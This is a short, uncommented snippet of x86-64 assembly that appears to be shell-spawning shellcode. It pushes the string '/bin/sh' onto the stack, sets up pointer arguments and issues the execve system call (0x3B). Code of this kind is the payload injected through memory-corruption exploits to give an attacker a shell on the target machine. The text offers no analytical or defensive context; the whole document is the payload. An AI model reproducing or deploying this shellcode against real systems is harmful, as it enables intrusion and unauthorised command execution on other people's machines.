xor %rax, %rax
pushq %rax
movq %rsp, %rdx
pushq %rdx
movq %rsp, %rsi
movq %rsp, %rdx
movq $0x68732f6e69622fff, %rax
shr $8, %rax
pushq %rax
movq %rsp, %rdi
movq $0x3B, %rax
syscall
